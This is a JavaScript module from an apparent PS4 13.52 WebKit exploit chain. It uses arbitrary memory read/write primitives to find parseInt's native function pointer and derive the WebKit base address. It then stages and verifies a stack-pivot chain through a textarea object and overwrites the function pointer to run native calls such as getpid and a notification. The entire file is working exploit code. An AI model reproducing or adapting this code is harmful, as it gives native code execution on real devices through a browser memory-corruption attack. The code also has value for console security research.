/**
 * PS4 13.52 native call — parseInt + carrier textarea (slopkit-core anchors).
 * Live re-scan fallback — does not rely on core.js module singleton (cache-safe).
 */
import { int64 } from "./int64.js";
import {
    prepNativeChain, layoutSmokeStack, fireNativeCall, firePivotSmoke,
    stageGetpid, stageNotify, firePivotTrigger,
    verifySlabContent, verifyBisectChainSet,
} from "./native_call.js";

const M_FUNCTION_OFF = 0x28;
const JSFUNC_EXECUTABLE_OFF = 0x18;
const CORE_NATIVE_SS = "wk-core-native";

/** JSC heap cell — same rules as mem.leakval / core.plausibleCell (0x2… is valid). */
function plausibleCell64(p) {
    if (!p) return false;
    if (p.hi > 0xffff) return false;
    if (p.low === 0 && p.hi === 0) return false;
    if ((p.low & 7) !== 0) return false;
    const v = (BigInt(p.hi >>> 0) << 32n) | BigInt(p.low >>> 0);
    return v > 0x100000000n && v <= 0xffffffffffffn;
}

/** Mapped code pointer (webkit / libkernel — 0x8… range). */
function plausibleCode64(p) {
    if (!plausibleCell64(p)) return false;
    return p.hi >= 0x80 && p.hi <= 0x8f;
}

function numToI64(n) {
    if (n == null) return null;
    if (typeof n === "object" && n != null && "low" in n)
        return new int64(n.low >>> 0, (n.hi >>> 0));
    if (typeof n === "string") {
        const s = n.replace(/^0x/i, "").trim();
        if (!s || !/^[0-9a-f]+$/i.test(s)) return null;
        if (s.length <= 8) return new int64(parseInt(s, 16) >>> 0, 0);
        if (s.length < 16) return new int64(parseInt(s.slice(-8), 16) >>> 0, 0);
        return new int64(
            parseInt(s.slice(-8), 16) >>> 0,
            parseInt(s.slice(0, -8), 16) >>> 0);
    }
    if (!Number.isFinite(n) || n <= 0) return null;
    return new int64(n >>> 0, Math.floor(n / 0x100000000) >>> 0);
}

function loadStoredNative() {
    try {
        const raw = sessionStorage.getItem(CORE_NATIVE_SS);
        if (!raw) return null;
        const j = JSON.parse(raw);
        if (!j) return null;
        const exec = numToI64(j.executable);
        const targetCell = numToI64(j.targetCell);
        if (!exec || !targetCell) return null;
        return {
            target: parseInt,
            targetCell: j.targetCell,
            executable: j.executable,
            nativeFn: j.nativeFn,
            textareaCell: j.textareaCell,
            holderCell: j.holderCell,
            _src: "sessionStorage",
        };
    } catch (_) {
        return null;
    }
}

function nativeFromCarrier(carrier) {
    if (!carrier) return null;
    if (carrier.native) {
        const exec = numToI64(carrier.native.executable);
        const tc = numToI64(carrier.native.targetCell);
        if (exec && tc)
            return Object.assign({ _src: "carrier.native" }, carrier.native);
    }
    if (Number.isFinite(carrier.textareaAddress) && carrier.textareaAddress > 0) {
        return {
            target: parseInt,
            textareaCell: carrier.textareaAddress,
            _src: "carrier.textareaAddress",
        };
    }
    return loadStoredNative();
}

/** Walk parseInt JSFunction → NativeExecutable+0x28 @ PRIMITIVE-OK (same as core validation). */
export function captureParseIntLive(p, carrier) {
    if (!p || typeof p.leakval !== "function")
        return { err: "no-p" };
    const textarea = carrier && carrier.textarea;
    if (!textarea)
        return { err: "no-textarea-on-carrier" };

    let targetCell;
    try { targetCell = p.leakval(parseInt); } catch (e) {
        return { err: "leakval(parseInt): " + (e && e.message ? e.message : e) };
    }
    if (!plausibleCell64(targetCell))
        return { err: "bad-parseInt-cell=" + targetCell };

    let exec;
    try { exec = p.read8(targetCell.add32(JSFUNC_EXECUTABLE_OFF)); } catch (e) {
        return { err: "read exec@+0x18: " + (e && e.message ? e.message : e) };
    }
    if (!plausibleCell64(exec))
        return { err: "bad-exec-ptr=" + exec };

    const mainMf = exec.add32(M_FUNCTION_OFF);
    let mainOrig;
    try { mainOrig = p.read8(mainMf); } catch (e) {
        return { err: "read m_function: " + (e && e.message ? e.message : e) };
    }
    if (!plausibleCode64(mainOrig))
        return { err: "bad-native-fn=" + mainOrig + "@+" + M_FUNCTION_OFF.toString(16) };

    let pivotCell;
    try { pivotCell = p.leakval(textarea); } catch (e) {
        const ta = numToI64(carrier.textareaAddress);
        if (!ta) return { err: "leakval(textarea) failed" };
        pivotCell = ta;
    }

    return {
        cap: {
            mainMf,
            mainOrig,
            nativeFn: mainOrig,
            pivotTrigger: parseInt,
            pivotBuiltinName: "parseint-live",
            path: "live-parseInt-scan",
            cell: targetCell,
            pivotObj: textarea,
            pivotCell,
            textarea,
        },
    };
}

export function captureFromCarrier(p, carrier, off) {
    const live = captureParseIntLive(p, carrier);
    if (live.cap) return live.cap;

    const nat = nativeFromCarrier(carrier);
    if (!nat) return null;

    const exec = numToI64(nat.executable);
    const targetCell = numToI64(nat.targetCell);
    if (!exec || !targetCell) {
        return null;
    }

    const mainMf = exec.add32(M_FUNCTION_OFF);
    let mainOrig;
    try { mainOrig = p.read8(mainMf); } catch (_) { return null; }
    if (!plausibleCode64(mainOrig)) return null;

    let pivotObj = carrier && carrier.textarea || null;
    let pivotCell = numToI64(nat.textareaCell);
    if (pivotObj) {
        try { pivotCell = p.leakval(pivotObj); } catch (_) { }
    }

    return {
        mainMf,
        mainOrig,
        nativeFn: mainOrig,
        pivotTrigger: nat.target || parseInt,
        pivotBuiltinName: "parseint-stored",
        path: "stored-" + (nat._src || "?"),
        cell: targetCell,
        pivotObj,
        pivotCell,
        textarea: pivotObj,
    };
}

export function webkitBaseFromCap(cap, off) {
    if (!cap || !cap.nativeFn || !off) return null;
    const rva = off.wk_parseint_native || off.wk_expm1_builtin;
    if (!rva) return null;
    const base = cap.nativeFn.sub32(rva);
    if (base.hi < 0x80 || base.hi > 0x8f) return null;
    if ((base.low & 0x3fff) !== 0) return null;
    return base;
}

export function prepCoreNative(p, off, carrier, opts) {
    opts = opts || {};
    const cap = captureFromCarrier(p, carrier, off);
    if (!cap) {
        const live = captureParseIntLive(p, carrier);
        throw new Error("core_native: " + (live.err || "parseInt anchors missing"));
    }
    return finishCorePrep(p, off, carrier, cap);
}

function finishCorePrep(p, off, carrier, cap) {
    if (!cap.pivotObj)
        throw new Error("core_native: carrier textarea missing");
    const webkitBase = webkitBaseFromCap(cap, off);
    if (!webkitBase)
        throw new Error("core_native: webkit base bad (parseInt rva "
            + (off.wk_parseint_native || 0).toString(16) + ") fn=" + cap.nativeFn);

    cap.pivotTrigger = cap.pivotTrigger || parseInt;
    const prep = prepNativeChain(p, off, webkitBase, cap);
    prep.pivotObj = cap.pivotObj;
    prep.pivotCell = cap.pivotCell || p.leakval(cap.pivotObj);
    prep._coreNative = true;
    prep._cap = cap;
    if (prep.keepAlive.indexOf(cap.pivotObj) < 0)
        prep.keepAlive.push(cap.pivotObj);
    if (carrier.textarea && prep.keepAlive.indexOf(carrier.textarea) < 0)
        prep.keepAlive.push(carrier.textarea);
    return prep;
}

export function verifyCoreChain(p, prep, off) {
    const wb = prep.webkitBase;
    if (!wb) return { ok: false, reason: "no webkitBase" };
    const v = verifyBisectChainSet(a => p.read1(a), wb, off);
    return { ok: v.ok, pivot: v.pivot, popBad: v.popBad };
}

export function fireCoreSmoke(p, prep, off, hookMode) {
    layoutSmokeStack(prep);
    const c = verifySlabContent(p, prep);
    if (!c.ok) throw new Error("core smoke slab: " + c.reasons.join("; "));
    return firePivotSmoke(p, prep, off, {
        hook: hookMode || "cell30",
        carrier: window._wkCarrier || null,
    });
}

export function fireCoreGetpid(p, prep, lk, off, hookMode) {
    const stubOff = off.k_stubs && off.k_stubs[20] != null ? off.k_stubs[20] : 0x2cb70;
    const opts = { hook: hookMode || "cell30", carrier: window._wkCarrier || null };
    stageGetpid(p, prep, lk, off, stubOff, opts);
    return fireNativeCall(p, prep, off, opts);
}

export function fireCoreNotify(p, prep, lk, off, hookMode, message) {
    const opts = { hook: hookMode || "cell30", carrier: window._wkCarrier || null };
    stageNotify(p, prep, lk, off, { message });
    return fireNativeCall(p, prep, off, opts);
}

export function bisectCoreTriggerLite(p, prep) {
    if (!prep.mainArmed && prep.mainMf && prep.G) {
        p.write8(prep.mainMf, prep.G.G0);
        prep.mainArmed = true;
    }
    firePivotTrigger(prep, 1);
}
